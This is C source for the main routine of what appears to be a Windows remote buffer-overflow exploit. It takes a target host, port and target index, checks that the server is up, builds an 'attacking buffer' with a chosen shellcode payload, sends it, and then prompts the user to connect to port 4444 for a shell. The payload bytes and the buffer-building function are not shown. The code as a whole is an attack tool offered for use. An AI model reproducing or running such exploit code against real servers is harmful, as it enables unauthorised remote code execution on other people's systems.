int main(int argc, char **argv)
{
	char * remotehost=NULL;
	char default_remotehost[]="127.0.0.1";
	char temp1[100], temp2[100];
	int port, itarget, sh;
	SOCKET s;
	char c;	
	int option_index=0;
	logo();
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	if(argc<2)
	{
		usage(argv[0]);		
		return -1;
	}

	// set defaults
	port=9999;
	itarget=-1;
	sh=0;
	// ------------	
	
	while((c = getopt(argc, argv, "h:p:t:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				remotehost=optarg;
				break; 	
			case 't':
				sscanf(optarg, "%d", &itarget);
				itarget--;
				break;
			case 'p':
				sscanf(optarg, "%d", &port);
				break;			
			default:
	            usage(argv[0]);
				WSACleanup();
			return -1;
		}		
	}	
	if(remotehost == NULL) remotehost=default_remotehost;
	memset(temp1,0,sizeof(temp1));
	memset(temp2,0,sizeof(temp2));
	memset(temp1, '\x20' , 58 - strlen(remotehost) -1);	
	printf(" #  Host    : %s%s# \n", remotehost, temp1);	
	sprintf(temp2, "%d", port);
	memset(temp1,0,sizeof(temp1));
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);
	printf(" #  Port    : %s%s# \n", temp2, temp1);
	memset(temp1,0,sizeof(temp1));	
	memset(temp2,0,sizeof(temp2));
	sprintf(temp2, "%s", shellcodes[sh].name );
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);	
	printf(" #  Payload : %s%s# \n", temp2, temp1);	
	if(itarget!=-1)
	{
		memset(temp1,0,sizeof(temp1));	
		memset(temp1, '\x20' , 58 - strlen(targets[itarget].t) -1);	
		printf(" #  Target  : %s%s# \n", targets[itarget].t, temp1);		
	}else
	{
		memset(temp1,0,sizeof(temp1));	
		memset(temp1, '\x20' , 58 - strlen("Please select target") -1);	
		printf(" #  Target  : %s%s# \n", "Please select target", temp1);
	}
	printf(" # ------------------------------------------------------------------- # \n");
	fflush(stdout);
	printf("   [+] Checking if server is online\n");
	fflush(stdout);
	s=do_connect(remotehost, port);   
	if(s==-1)
	{
		printf("   [-] Server is OFFLINE\n");
		end_logo();
		return 0;
	}
	closesocket(s);
	printf("   [+] Server is ONLINE\n");

	
	unsigned char buf[30000];
	memset(buf,0,sizeof(buf));
	fflush(stdout);
	
	make_buffer(buf, itarget, sh);
	printf("   [+] Attacking buffer constructed\n");
	if(send_buffer(buf, remotehost,port)==-1)
	{
		printf("   [-] Cannot exploit server %s\n", remotehost);
		end_logo();
		WSACleanup();
		return -1;
	}

	printf("   [+] Buffer sent\n");
	printf("   [+] Connect to %s:%d\n", remotehost, 4444);
	end_logo();
	WSACleanup();
	return 0;
}